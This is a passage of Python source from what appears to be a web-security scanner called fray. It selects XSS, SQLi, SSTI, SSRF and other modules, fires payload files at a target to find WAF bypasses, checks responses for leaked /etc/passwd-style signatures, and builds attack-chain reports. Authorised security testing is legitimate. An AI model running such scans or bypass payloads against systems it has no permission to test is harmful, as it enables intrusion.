                out.write(summary_line("Email Security", f"{', '.join(email_prov_inline[:3])}", "dim") + "\n")

            # 8a. Domain registration / RDAP
            rdap_inline = _rd_inline.get("rdap", {})
            if isinstance(rdap_inline, dict) and rdap_inline.get("found"):
                rdap_parts = []
                reg = rdap_inline.get("registered", "")
                age = rdap_inline.get("domain_age_days")
                exp = rdap_inline.get("expires", "")
                registrar = rdap_inline.get("registrar", "")[:35]
                ns_rdap = rdap_inline.get("nameservers", [])[:2]
                dns_prov = _rd_inline.get("dns_provider", "")
                if reg:
                    rdap_parts.append(f"registered {reg}")
                if age is not None:
                    if age < 365:
                        rdap_parts.append(f"{S.error}{age}d old (new!){S.reset}")
                    else:
                        rdap_parts.append(f"{age // 365}y old")
                if exp:
                    rdap_parts.append(f"expires {exp}")
                if registrar:
                    rdap_parts.append(f"via {registrar}")
                if dns_prov:
                    rdap_parts.append(f"DNS: {dns_prov}")
                if rdap_parts:
                    out.write(summary_line("Domain", "  ".join(rdap_parts), "dim") + "\n")

            # 8. Parameters found (injectable)
            param_inline = _rd_inline.get("parameters", _rd_inline.get("parameter_discovery", {}))
            if isinstance(param_inline, dict):
                injectable = param_inline.get("injectable_params", [])
                all_params = param_inline.get("parameters_found", list(param_inline.get("parameters", {}).keys()))
                if injectable:
                    out.write(summary_line("Injectable Params", f"{S.warning}{len(injectable)} param(s){S.reset} with reflection signals: {', '.join(injectable[:5])}", "") + "\n")
                elif all_params:
                    out.write(summary_line("Parameters", f"{len(all_params)} discovered: {', '.join(str(p) for p in all_params[:5])}", "dim") + "\n")

            # ── Attack Vectors summary (mirrors dashboard) ──────────────────
            atk_inline = _rd_inline.get("attack_surface", {})
            vectors_inline = atk_inline.get("attack_vectors", atk_inline.get("vectors", [])
                             ) if isinstance(atk_inline, dict) else []

            if vectors_inline:
                from fray.ui import _term_width as _tw2
                _w2 = _tw2()
                out.write(f"\n  {S.bold}{S.white}▸ Attack Vectors{S.reset} {S.dark}({len(vectors_inline)} identified){S.reset}\n")
                # Sort by priority descending, show top 6
                _sev_col = {"critical": S.error, "high": S.high, "medium": S.warning,
                           "low": S.dim, "info": S.dim}
                # CRITICAL first, then HIGH, then by priority
                _inline_sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
                _sorted_vecs = sorted(
                   vectors_inline,
                     key=lambda v: (_inline_sev_rank.get(v.get("severity", "info"), 4),
                                    -v.get("priority", 0))
                )[:8]
                _rd_ref = self.recon_result or {}
                for vec in _sorted_vecs:
                   vtype = vec.get("type", "Unknown")
                   vsev  = vec.get("severity", "medium")
                   vtgts = vec.get("targets", [])
                   vcol  = _sev_col.get(vsev, S.dim)
                   vtgt_display = ""
                   if vtgts:
                       first_tgt = vtgts[0].replace("https://", "").replace("http://", "").rstrip("/")
                       if len(first_tgt) > 50:
                           first_tgt = first_tgt[:49] + "…"
                       vtgt_display = f" {S.dark}→{S.reset} {S.target}{first_tgt}{S.reset}"
                       if len(vtgts) > 1:
                           vtgt_display += f" {S.dark}+{len(vtgts)-1} more{S.reset}"
                   out.write(f"  {vcol}■{S.reset} {S.bold}{vtype[:38]:<38}{S.reset}"
                             f" {vcol}[{vsev.upper()[:4]}]{S.reset}"
                             f"{vtgt_display}\n")
                   # Extra context line per vector type
                   detail_hint = ""
                   vtype_l = vtype.lower()
                   if "supply chain" in vtype_l or "magecart" in vtype_l:
                       sri_miss = _rd_ref.get("supply_chain", {})
                       sri_list = sri_miss.get("sri_missing_on_payment", []) if isinstance(sri_miss, dict) else []
                       if sri_list:
                           s0 = str(sri_list[0])
                           detail_hint = f"script without SRI: {s0[:55] + '…' if len(s0)>55 else s0}"
                   elif "csp" in vtype_l or "xss" in vtype_l:
                       csp_data = _rd_ref.get("csp_analysis", {})
                       if isinstance(csp_data, dict):
                           grade = csp_data.get("grade", "")
                           bypasses = csp_data.get("bypasses", [])
                           policy = csp_data.get("policy", "")
                           parts = []
                           if grade:
                               parts.append(f"CSP grade {grade}")
                           if bypasses:
                               parts.append(f"bypass: {str(bypasses[0].get('technique','?'))[:35]}")
                           elif policy:
                               weak = [d.strip() for d in policy.split(";") if "unsafe" in d.lower() or "* " in d or d.strip()=="*"]
                               if weak:
                                   parts.append(f"weak: {weak[0][:40]}")
                           if parts:
                               detail_hint = " | ".join(parts)
                   elif "2fa" in vtype_l or "mfa" in vtype_l:
                       tfa_data = _rd_ref.get("twofa_bypass", {})
                       if isinstance(tfa_data, dict):
                           f0s = tfa_data.get("findings", [])
                           if f0s:
                               f0 = f0s[0]
                               path = f0.get("path", f0.get("endpoint", ""))
                               status = f0.get("status", "")
                               finding_txt = str(f0.get("finding", ""))[:45]
                               detail_hint = f"POST {path}" + (f" → HTTP {status}" if status else "") + (f" | {finding_txt}" if finding_txt else "")
                   elif "api" in vtype_l:
                       api_data = _rd_ref.get("api_security", {})
                       if isinstance(api_data, dict):
                           spec = api_data.get("spec_url", "")
                           gw = (api_data.get("api_gateway") or {}).get("vendor", "")
                           auth_ok = (api_data.get("authentication") or {}).get("detected", False)
                           hints = []
                           if spec:
                               hints.append(f"spec: {spec.replace('https://','')[:40]}")
                           if gw:
                               hints.append(f"gateway: {gw}")
                           if not auth_ok:
                               hints.append("no auth detected")
                           detail_hint = " | ".join(hints)
                   elif "unprotected" in vtype_l:
                       probe_res = vec.get("probe_results", [])
                       if probe_res:
                           pr = probe_res[0]
                           if pr.get("confirmed_xss") and pr.get("xss_hits"):
                               detail_hint = f"XSS reflected: {pr['xss_hits'][0].get('technique','?')}"
                           elif pr.get("confirmed_sqli") and pr.get("sqli_hits"):
                               detail_hint = f"SQLi error: {str(pr['sqli_hits'][0].get('error_text','?'))[:40]}"
                           else:
                               detail_hint = "no WAF → all payloads reach origin server unfiltered"
                   if detail_hint:
                       out.write(f"     {S.dim}{detail_hint}{S.reset}\n")
            out.write("\n")
            out.flush()

        # ── Phase 2: Smart Testing ─────────────────────────────────────
        vuln_types: List[str] = []
        _smart_cats: List[str] = []

        if not self.quiet:
            _waf_note = f" against {waf}" if waf else ""
            out.write(phase_header(2, "Smart Vulnerability Testing"))
            out.write(f"  {S.dim}Selecting payloads based on recon findings{_waf_note}...{S.reset}\n")
        if _dash:
            _dash.set_phase(2, "Testing", total=5)

        # Build interactive menu to determine what to test
        menu = ReconInteractive(self.target, self.recon_result)
        classified = menu._classify_findings()

        # Determine vuln types to test — from findings or recommendations
        vuln_types = []
        for vuln_type, vuln_findings in classified.items():
            if vuln_type != "other" and vuln_type in _VULN_MODULE_MAP:
                info = _VULN_MODULE_MAP[vuln_type]
                if info[0]:  # Has a runnable module
                    vuln_types.append(vuln_type)

        if not vuln_types and recs:
            for cat in recs[:3]:
                cat_name = cat if isinstance(cat, str) else cat.get("category", "")
                if cat_name in _VULN_MODULE_MAP and _VULN_MODULE_MAP[cat_name][0]:
                    vuln_types.append(cat_name)

        # ── Signal-based detection model enhancement ──────────────────────
        # Augment vuln_types based on specific recon signals beyond keyword classification
        _rd2 = self.recon_result or {}

        # Supply chain detected → CSP bypass is the primary test
        sc_signal = _rd2.get("supply_chain", {})
        if isinstance(sc_signal, dict) and sc_signal.get("risk_level") in ("critical", "high"):
            if "csp_bypass" not in vuln_types:
                vuln_types.insert(0, "csp_bypass")

        # Injectable parameters found → XSS and SQLi tests
        _pm = _rd2.get("parameters", _rd2.get("parameter_discovery", {}))
        if isinstance(_pm, dict) and _pm.get("injectable_params"):
            if "xss" not in vuln_types:
                vuln_types.insert(0, "xss")
            if "sqli" not in vuln_types:
                vuln_types.append("sqli")

        # Auth endpoints found → SSTI (template injection in login/register often overlooked)
        _ae = _rd2.get("auth_endpoints", {})
        if isinstance(_ae, dict) and _ae.get("endpoints"):
            if "ssti" not in vuln_types:
                vuln_types.append("ssti")

        # API endpoints found → API security + SSRF
        _api2 = _rd2.get("api_security", {})
        if isinstance(_api2, dict) and (_api2.get("endpoints") or _api2.get("api_endpoints")):
            if "api_security" not in vuln_types:
                vuln_types.append("api_security")
            if "ssrf" not in vuln_types:
                vuln_types.append("ssrf")

        # JS/React app detected → prototype pollution
        _fp2 = _rd2.get("fingerprint", {})
        _techs2 = (_fp2.get("technologies", {}) if isinstance(_fp2, dict) else {})
        _is_js_app = any(t.lower() in ("react", "vue", "angular", "next", "next.js", "express", "nodejs")
                         for t in _techs2.keys())
        if _is_js_app and "prototype_pollution" not in vuln_types:
            vuln_types.append("prototype_pollution")

        # No WAF + any findings → modern bypass not needed, prefer direct exploitation
        if not waf and "modern_bypasses" in vuln_types:
            vuln_types.remove("modern_bypasses")  # Skip bypass techniques if no WAF

        # Fallback: always include core + semantic scanner categories
        if not vuln_types:
            vuln_types = ["xss", "sqli", "ssti", "csp_bypass", "modern_bypasses"]

        if not self.quiet:
            mods = f"{S.white}{', '.join(vuln_types)}{S.reset}"
            out.write(f"  {S.dim}Modules:{S.reset} {mods}\n\n")
            out.flush()

        # Run test modules in parallel — max_workers scales with WAF aggressiveness
        # Cloudflare/Akamai can handle more; unknown WAF be conservative
        _waf_workers = 5 if waf else 3
        module_results = []
        if len(vuln_types[:5]) > 1:
            import concurrent.futures as _cf_test
            _max_w = min(_waf_workers, len(vuln_types[:5]))
            with _cf_test.ThreadPoolExecutor(max_workers=_max_w) as _tpool:
                _futs = {_tpool.submit(menu._run_module, vt, self.target, {}): vt
                         for vt in vuln_types[:5]}
                for fut in _cf_test.as_completed(_futs, timeout=120):
                    try:
                        res = fut.result(timeout=60)
                        if res:
                            module_results.append(res)
                            # Cache confirmed bypasses immediately
                            try:
                                from fray.adaptive_cache import save_scan_results, _extract_domain
                                bypasses = res.get("bypasses", [])
                                if isinstance(bypasses, list) and bypasses:
                                    save_scan_results(
                                        [{"payload": b.get("payload", ""),
                                          "blocked": False, "bypass_confidence": 80,
                                          "category": res.get("module", "").replace("smart_", "")}
                                         for b in bypasses],
                                        domain=_extract_domain(self.target),
                                        waf_vendor=waf or "",
                                    )
                            except Exception:
                                pass
                    except Exception:
                        pass
        else:
            for vtype in vuln_types[:5]:
                res = menu._run_module(vtype, self.target, {})
                if res:
                    module_results.append(res)

        # ── Smart payload testing (WAFTester + clustering + vendor mutations) ──
        # If recon found a WAF and recommended xss/sqli categories, run an
        # adaptive clustered test using WAFTester with impersonation.
        # Auto-parallel: use recon intelligence to pick safe concurrency.
        _smart_results = []
        if not _smart_cats:
            _smart_cats = [c for c in (recs[:2] if recs else ["xss"]) if isinstance(c, str)]
        if not _smart_cats:
            _smart_cats = [c.get("category", "") for c in recs[:2] if isinstance(c, dict)]
        _smart_cats = [c for c in _smart_cats if c][:2]

        _concurrency = _auto_concurrency(self.recon_result)

        if _smart_cats:
            try:
                from fray.tester import WAFTester
                from fray.evolve import cluster_payloads, test_clustered
                from pathlib import Path as _P
                import json as _jmod

                _payloads_dir = _P(__file__).parent / "payloads"
                _waf_vendor = waf.split("(")[0].strip() if waf else None
                _imp = self.impersonate

                for _sc in _smart_cats:
                    _cat_dir = _payloads_dir / _sc
                    if not _cat_dir.exists():
                        continue

                    # Load both JSON (*.json) and text (*.txt) payloads
                    _payloads = []
                    for _pf in sorted(_cat_dir.glob("*.json"))[:5]:
                        try:
                            _raw = _jmod.loads(_pf.read_text(encoding="utf-8"))
                            # Handle {"payloads": [...]} and bare list formats
                            _plist = (_raw.get("payloads", _raw)
                                      if isinstance(_raw, dict) else _raw)
                            if isinstance(_plist, list):
                                _payloads.extend(_plist)
                        except Exception:
                            pass
                    for _pf in sorted(_cat_dir.glob("*.txt")):
                        try:
                            for _ln in _pf.read_text(encoding="utf-8").splitlines():
                                _s = _ln.strip()
                                if _s and not _s.startswith("#"):
                                    _payloads.append({"payload": _s, "type": _sc})
                        except Exception:
                            pass

                    # Adaptive cache: sort by bypass likelihood; skip known-blocked
                    try:
                        from fray.adaptive_cache import smart_sort_payloads, _extract_domain
                        _dom = _extract_domain(self.target)
                        _payloads = smart_sort_payloads(
                            _payloads, domain=_dom, waf_vendor=_waf_vendor or "")
                    except Exception:
                        pass

                    if not _payloads or len(_payloads) < 2:
                        continue

                    _mode_label = f"\u26A1 parallel\u00D7{_concurrency}" if _concurrency > 1 else "sequential"
                    if not self.quiet:
                        out.write(f"  \u25B6 Smart {_sc.upper()} test ({len(_payloads)} payloads")
                        if _waf_vendor:
                            out.write(f", vendor: {_waf_vendor}")
                        out.write(f", {_mode_label})...")
                        out.flush()

                    # Parallel path: use async engine for speed
                    if _concurrency > 1:
                        try:
                            from fray.async_engine import parallel_test_payloads, ResponseBaseline
                            _payload_strs = [p.get("payload", p) if isinstance(p, dict)
                                             else str(p) for p in _payloads[:100]]
                            _baseline = ResponseBaseline.capture(
                                self.target, param="q", method="GET",
                                timeout=6, verify_ssl=False,
                                headers=self.headers,
                            )
                            _par_res = parallel_test_payloads(
                                url=self.target, param="q",
                                payloads=_payload_strs,
                                method="GET", category=_sc,
                                concurrency=_concurrency,
                                timeout=6, verify_ssl=False,
                                headers=self.headers,
                                baseline=_baseline,
                                follow_redirect=True,
                            )
                            # A genuine bypass must: not be blocked + return meaningful status
                            # 404 = path not found (not a vulnerability)
                            # 400 = bad request (request reached server but not exploitable)
                            # Only 200/201/301/302 + content signals = real bypass
                            def _is_real_bypass(r):
                                if r.get("blocked", True):
                                    return False
                                st = r.get("status", 0)
                                if st in (404, 400, 405, 410, 421, 408, 426, 431, 501, 502, 503):
                                    return False  # Not Found / Method Not Allowed = not vulnerable
                                # For reflection-based attacks (XSS/injection), require reflection
                                if _sc in ("xss", "sqli", "ssti", "crlf") and not r.get("reflected"):
                                    return False
                                # For path traversal / LFI: require file-disclosure signals
                                # A plain 200 doesn't confirm path traversal — need actual file content
                                if _sc in ("path_traversal", "lfi"):
                                    resp_body = r.get("response_body", r.get("body", ""))
                                    if resp_body:
                                        body_lower = resp_body.lower()
                                        # Check for actual file disclosure indicators
                                        # Pre-filter: HTML pages and Windows responses are not file disclosures
                                        if "<!doctype html" in body_lower or "windows" in body_lower:
                                            return False
                                        _lfi_signals = [
                                            "root:x:", "root:!:", "root:/root",  # /etc/passwd
                                            "[extensions]", "[fonts]",           # win.ini
                                            "# /etc/hosts",                      # /etc/hosts
                                        ]
                                        # Only flag if we see real file content signals
                                        if not any(s in body_lower for s in _lfi_signals):
                                            return False
                                    elif r.get("response_length", 0) == r.get("baseline_length", -1):
                                        # Same length as baseline → app returns 200 for everything
                                        return False
                                return True
                            _bypasses = [r for r in _par_res if _is_real_bypass(r)]
                            _fp = sum(1 for r in _par_res if r.get("false_positive"))
                            _result = {
                                "module": f"smart_{_sc}",
                                "target": self.target,
                                "vulnerable": len(_bypasses) > 0,
                                "findings": len(_bypasses),
                                "requests": len(_par_res),
                                "false_positives": _fp,
                                "parallel": _concurrency,
                                "bypasses": [{"payload": b.get("payload", ""), "status": b.get("status", 0)}
                                            for b in _bypasses[:10]],
                            }
                            _smart_results.append(_result)
                            if not self.quiet:
                                _status = f"{S.error}{len(_bypasses)} bypass(es){S.reset}" if _bypasses else f"{S.success}clean{S.reset}"
                                _fp_tag = f", {_fp} FP filtered" if _fp else ""
                                out.write(f" {_status} ({len(_par_res)} reqs{_fp_tag})\n")
                                out.flush()
                            continue  # Skip sequential fallback
                        except ImportError:
                            pass  # Fall through to sequential

                    # Sequential fallback (or concurrency=1)
                    _t = WAFTester(
                        self.target, timeout=6, delay=0.1,
                        verify_ssl=False, stealth=self.stealth,
                        impersonate=_imp,
                    )
                    _cluster_res = test_clustered(_t, _payloads[:100], param="q")
                    _bypasses = [r for r in _cluster_res
                                if not r.get("blocked", True)
                                and r.get("status", 0) not in (404, 400, 405, 410, 421, 408, 426, 431, 501, 502, 503)
                                and (r.get("reflected") or _sc not in ("xss", "sqli", "ssti", "crlf"))]
                    _n_req = sum(1 for r in _cluster_res if not r.get("skipped_by_cluster"))
                    _n_skip = sum(1 for r in _cluster_res if r.get("skipped_by_cluster"))

                    _result = {
                        "module": f"smart_{_sc}",
                        "target": self.target,
                        "vulnerable": len(_bypasses) > 0,
                        "findings": len(_bypasses),
                        "requests": _n_req,
                        "skipped_by_cluster": _n_skip,
                        "bypasses": [{"payload": b.get("payload", ""), "family": b.get("family", "")} for b in _bypasses[:10]],
                    }
                    _smart_results.append(_result)

                    if not self.quiet:
                        _status = f"{S.error}{len(_bypasses)} bypass(es){S.reset}" if _bypasses else f"{S.success}clean{S.reset}"
                        out.write(f" {_status} ({_n_req} reqs, {_n_skip} skipped by cluster)\n")
                        out.flush()
            except Exception:
                pass

        module_results.extend(_smart_results)

        total_vulns = sum(1 for r in module_results if r.get("vulnerable"))
        total_findings = sum(r.get("findings", 0) for r in module_results)
        total_requests = sum(r.get("requests", 0) for r in module_results)

        # Feed dashboard with test results
        if _dash:
            _dash.update_progress(done=_dash._total)
            _dash.update_stat("requests", total_requests)
            _dash.update_stat("bypasses", total_vulns)
            for _mr in module_results:
                if _mr.get("vulnerable"):
                    _dash.add_finding(f"{_mr.get('module', '?')}: vulnerable", "high")

        if not self.quiet and module_results:
            # Brief one-liner — full breakdown shown in Final Summary below
            vuln_c = S.error if total_vulns > 0 else S.success
            vuln_label = f"{vuln_c}{total_vulns} vulnerable{S.reset}" if total_vulns > 0 else f"{S.success}clean{S.reset}"
            out.write(f"\n  {S.success}✔{S.reset} {S.bold}{S.white}Testing complete{S.reset}  {S.dim}{len(module_results)} modules · {vuln_label}\n")
            out.write("\n")
            out.flush()

        self.test_results = module_results
        summary["phases"].append({
            "name": "test",
            "modules_tested": vuln_types[:5],
            "count": len(vuln_types[:5]),
            "vulnerable": total_vulns,
            "findings": total_findings,
            "requests": total_requests,
            "results": module_results,
        })

        # ── Phase 3: Report ────────────────────────────────────────────
        if not self.quiet:
            out.write(phase_header(3, "Report Generation"))
            out.write(f"  {S.dim}Compiling findings into HTML report with remediation guidance...{S.reset}\n")

        domain = self.recon_result.get("host", "target")
        if self.output_dir:
            self.report_path = os.path.join(self.output_dir, f"{domain}_report.html")
        else:
            self.report_path = f"{domain}_report.html"

        try:
            from fray.reporter import SecurityReportGenerator
            gen = SecurityReportGenerator()
            gen.generate_recon_html_report(
                self.recon_result,
                self.report_path,
                share_url=self.share_url,
                test_results=self.test_results or [],
            )
            if not self.quiet:
                report_abs = os.path.abspath(self.report_path)
                out.write(f"  {S.success}\u2714{S.reset} {S.white}HTML report:{S.reset} {S.target}{self.report_path}{S.reset}\n")
                out.write(f"  {S.success}\u2714{S.reset} {S.white}Dashboard updated{S.reset} {S.dim}— run{S.reset} {S.target}fray dashboard{S.reset} {S.dim}to view live{S.reset}\n")
                out.write(f"\n  {S.dim}Open report:    open {self.report_path}{S.reset}\n")
                out.write(f"  {S.dim}Open dashboard: fray dashboard{S.reset}\n")

            # Auto-open the HTML report in the default browser
            # Skip in CI/quiet mode, or if --no-open was passed
            if self.open_browser and not self.quiet:
                try:
                    import webbrowser as _wb
                    _wb.open(f"file://{os.path.abspath(self.report_path)}")
                except Exception:
                    pass  # Non-critical — report still saved
        except Exception as e:
            if not self.quiet:
                out.write(f"  {S.warning}\u26a0{S.reset} Report generation failed: {e}\n")

        summary["phases"].append({
            "name": "report",
            "path": self.report_path,
        })

        # Finish dashboard
        if _dash:
            _dash.set_phase(3, "Report", total=1)
            _dash.update_progress(done=1)
            _dash.finish()

        # ── Final Summary ──────────────────────────────────────────────
        elapsed = time.monotonic() - t0
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        duration = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
        summary["duration"] = duration

        if not self.quiet:
            from fray.ui import _term_width as _tw
            _w = _tw()
            out.write(f"\n  {S.success}{'━' * _w}{S.reset}\n")
            out.write(f"  {S.success}{S.bold}  ✔  Pipeline Complete{S.reset}\n")
            out.write(f"  {S.success}{'━' * _w}{S.reset}\n\n")

            risk_c = severity_color(risk_level.lower() if risk_level != "?" else "info")
            # Fix 4: label both durations clearly (recon phase vs total pipeline)
            recon_elapsed = self.recon_result.get("elapsed_s", 0) if self.recon_result else 0
            if recon_elapsed and abs(recon_elapsed - (int(elapsed // 60)*60 + int(elapsed % 60))) > 5:
                recon_dur = f"{recon_elapsed:.1f}s"
                out.write(summary_line("Recon duration", recon_dur) + "\n")
                out.write(summary_line("Total duration", duration) + "\n")
            else:
                out.write(summary_line("Duration", duration) + "\n")
            out.write(f"  {S.gray}{'Risk':<20}{S.reset} {risk_c}{risk}/100 ({risk_level}){S.reset}\n")
            if waf:
                out.write(summary_line("WAF", waf, "accent") + "\n")
            out.write(summary_line("Recon findings", str(len(findings))) + "\n")
            # Fix 5: show all module names, not just count capped at 5
            if vuln_types:
                mods_str = f"{len(vuln_types)} ({', '.join(vuln_types)})"
                out.write(summary_line("Modules tested", mods_str) + "\n")
            # Fix 3: surface vulnerable module names prominently
            if total_vulns > 0:
                vuln_modules = [r.get("module", "?") for r in module_results if r.get("vulnerable")]
                vuln_str = f"{S.error}{total_vulns} vulnerable{S.reset}"
                if vuln_modules:
                    vuln_str += f" — {S.error}{', '.join(vuln_modules[:4])}{S.reset}"
                out.write(f"  {S.gray}{'Vulnerabilities':<20}{S.reset} {vuln_str}\n")
            else:
                out.write(f"  {S.gray}{'Vulnerabilities':<20}{S.reset} {S.success}0 (clean){S.reset}\n")
            if total_findings > 0:
                out.write(summary_line("Test findings", str(total_findings)) + "\n")
            out.write(summary_line("Total requests", str(total_requests)) + "\n")
            out.write(summary_line("Report", self.report_path, "target") + "\n")
            if self.share_url:
                out.write(summary_line("Public share", self.share_url, "target") + "\n")

            # ── Attack Chain ─────────────────────────────────────────────
            # Shows the realistic path an ATTACKER would take against this target.
            # Each step has a command you can run to validate the finding.
            # Only shown when risk >= 40 and real findings exist.
            chain = []
            chain_commands: set = set()  # track commands used in chain for dedup below
            chain_categories: set = set()

            if risk >= 40:
                chain = _build_attack_chain(
                    target=self.target,
                    recon_result=self.recon_result,
                    test_results=self.test_results,
                    risk=risk,
                    waf=waf,
                )
                if chain:
                    out.write(section_title("Attack Chain"))
                    out.write(
                        f"  {S.dim}How an attacker would exploit this target — "
                        f"ordered from initial access to impact:{S.reset}\n\n"
                    )
                    for i, step in enumerate(chain, 1):
                        step_col = (S.error if step["severity"] == "critical"
                                    else S.warning if step["severity"] == "high"
                                    else S.dim)
                        sev_label = step["severity"].upper()
                        out.write(
                            f"  {step_col}{i}.{S.reset} {S.bold}{step['title']}{S.reset}"
                            f"  {step_col}[{sev_label}]{S.reset}\n"
                        )
                        out.write(f"     {S.dim}{step['detail']}{S.reset}\n")
                        if step.get("mitre"):
                            # Translate MITRE code to human-readable technique name
                            _MITRE_NAMES = {
                                "T1190":     "Exploit public-facing application",
                                "T1195.002": "Supply chain — CDN/software compromise",
                                "T1059.007": "JavaScript execution via XSS",
                                "T1059":     "Command/script execution",
                                "T1078":     "Valid account credential abuse",
                                "T1078.003": "Local/admin account takeover",
                                "T1552.005": "Cloud credential theft via SSRF",
                                "T1090":     "SSRF — internal network pivot",
                                "T1562.001": "WAF/defence evasion — bypass",
                                "T1621":     "Multi-factor authentication bypass",
                                "T1133":     "External remote access exploitation",
                            }
                            mitre_id = step["mitre"]
                            mitre_name = _MITRE_NAMES.get(mitre_id, mitre_id)
                            out.write(f"     {S.dark}Technique: {mitre_name} ({mitre_id}){S.reset}\n")
                        if step.get("command"):
                            out.write(f"     {S.target}▸ {step['command']}{S.reset}\n")
                            chain_commands.add(step["command"])
                        if step.get("_cat"):
                            chain_categories.add(step["_cat"])
                        if i < len(chain):
                            out.write(f"     {S.dark}↓{S.reset}\n")
                    out.write("\n")

            # ── What's Next ───────────────────────────────────────────────
            # Commands YOU should run next with Fray.
            # Different from Attack Chain:
            #   Attack Chain = attacker's path (what the threat looks like)
            #   What's Next  = your next Fray commands (validation, depth, hardening)
            # We suppress What's Next entries that duplicate Attack Chain commands.
            out.write(section_title("What's Next"))
            out.write(
                f"  {S.dim}Next Fray commands to validate, deepen, or remediate findings:{S.reset}\n\n"
            )
            hints = _build_whats_next(
                target=self.target,
                recon_result=self.recon_result,
                test_results=self.test_results,
                waf=waf,
                recs=recs,
                risk=risk,
            )
            # Deduplicate: skip What's Next hints whose command already appears
            # in the Attack Chain (same action, different context = confusing)
            shown_hints = 0
            for command, description in hints:
                # Skip exact duplicates
                if command in chain_commands:
                    continue
                # Skip near-duplicates: same base command + target
                base = command.split(" --")[0].strip()
                if any(base in cc for cc in chain_commands):
                    continue
                out.write(cmd_hint(command, description) + "\n")
                shown_hints += 1
            # If all hints were duplicated, show at least hardening
            if shown_hints == 0:
                out.write(cmd_hint(f"fray harden {self.target}",
                                   "Security headers + OWASP hardening audit") + "\n")
            out.write("\n")
            out.flush()

        # Also export recon JSON
        try:
            recon_json_path = self.report_path.replace(".html", ".json")
            with open(recon_json_path, "w", encoding="utf-8") as f:
                json.dump(self.recon_result, f, indent=2, ensure_ascii=False)
            summary["recon_json"] = recon_json_path
        except Exception:
            pass

        return self._serialize_summary(summary)

    def _share_snapshot(self) -> None:
        """Share sanitized recon snapshot via Cloudflare R2."""
        if not self.recon_result:
            return

        host = (self.recon_result.get("host") or "").strip()
        if not host:
            if not self.quiet:
                sys.stderr.write("  ⚠ Share skipped — recon host unavailable.\n")
            return

        domain = host.replace("https://", "").replace("http://", "").strip("/")
        if not domain:
            if not self.quiet:
                sys.stderr.write("  ⚠ Share skipped — invalid host.\n")
            return

        try:
            from fray.cloud_sync import share_domain, extend_share, list_shares
        except Exception as exc:  # pragma: no cover - optional dependency
            if not self.quiet:
                sys.stderr.write(f"  ⚠ Share unavailable: {exc}\n")
            return

        existing_share_id = None
        try:
            shares_snapshot = list_shares() or {}
            for sid, info in shares_snapshot.items():
                if info.get("domain") == domain:
                    existing_share_id = sid
                    break
        except Exception:
            existing_share_id = None

        share_id: Optional[str] = existing_share_id
        share_action = "new"
        url: Optional[str] = None
        share_info: Optional[Dict[str, Any]] = None

        if existing_share_id:
            try:
                url = extend_share(existing_share_id, days=self.share_expires, verbose=False)
                if url:
                    share_action = "extended"
            except Exception as exc:
                if not self.quiet:
                    sys.stderr.write(f"  ⚠ Share extend failed ({exc}) — creating new snapshot.\n")
                url = None

        if not url:
            try:
                url = share_domain(domain, expires_days=self.share_expires, verbose=False)
                share_action = "new"
            except Exception as exc:  # pragma: no cover - share failure
                if not self.quiet:
                    sys.stderr.write(f"  ⚠ Share failed: {exc}\n")
                return

        if not url:
            if not self.quiet:
                sys.stderr.write("  ⚠ Share failed — check R2 configuration.\n")
            return

        if not share_id:
            # Derive share ID from viewer URL (…/?id=<share_id>)
            if "?id=" in url:
                share_id = url.split("?id=")[-1].split("&")[0]

        expiry_note = ""
        if share_id:
            try:
                updated = list_shares() or {}
                share_info = updated.get(share_id, {})
                expires_at = share_info.get("expires_at")
                if expires_at:
                    expiry_note = f" (expires {expires_at[:19]})"
            except Exception:
                share_info = None

        self.share_url = url
        self._record_share_metadata(share_id, url, share_info)
        if not self.quiet:
            if share_action == "extended":
                sys.stderr.write(f"  ♻  Extended share {share_id or ''}: {url}{expiry_note}\n")
            else:
                sys.stderr.write(f"  📤 Public snapshot: {url}{expiry_note}\n")

    def _record_share_metadata(self, share_id: Optional[str], share_url: str,
                               share_info: Optional[Dict[str, Any]] = None) -> None:
        if not share_url:
            return
        info = share_info
        if share_id and info is None:
            try:
                from fray.cloud_sync import list_shares
                info = (list_shares() or {}).get(share_id, {})
            except Exception:
                info = None

        expires_at = (info or {}).get("expires_at")
        status = _share_status(expires_at)
        domain = (info or {}).get("domain")
        if not domain and isinstance(self.recon_result, dict):
            domain = self.recon_result.get("host")

        share_meta = {
            "id": share_id,
            "url": share_url,
            "domain": domain,
            "shared_at": (info or {}).get("shared_at"),
            "expires_at": expires_at,
            "status": status,
        }
        self.share_meta = share_meta

        if isinstance(self.recon_result, dict):
            self.recon_result["_share"] = {
                "id": share_id,
                "domain": domain,
                "shared_at": (info or {}).get("shared_at"),
                "expires_at": expires_at,
                "status": status,
            }

    def _serialize_summary(self, summary: Dict[str, Any]) -> Dict[str, Any]:
        if self.share_url:
            summary["share_url"] = self.share_url
        if self.share_meta:
            summary["share"] = self.share_meta
        return summary

    def _phase_header(self, num: int, name: str) -> None:
        if not self.quiet:
            from fray.ui import phase_header as _ph
            sys.stderr.write(_ph(num, name))
            sys.stderr.flush()

    def _run_recon(self) -> Optional[dict]:
        """Run recon and return result dict."""
        try:
            from fray.recon import run_recon
            mode = "deep" if self.deep else "default"
            return run_recon(
                self.target,
                timeout=self.timeout,
                headers=self.headers,
                mode=mode,
                stealth=self.stealth,
                quiet=self.quiet,
            )
        except Exception as e:
            sys.stderr.write(f"  Error: {e}\n")
            return None
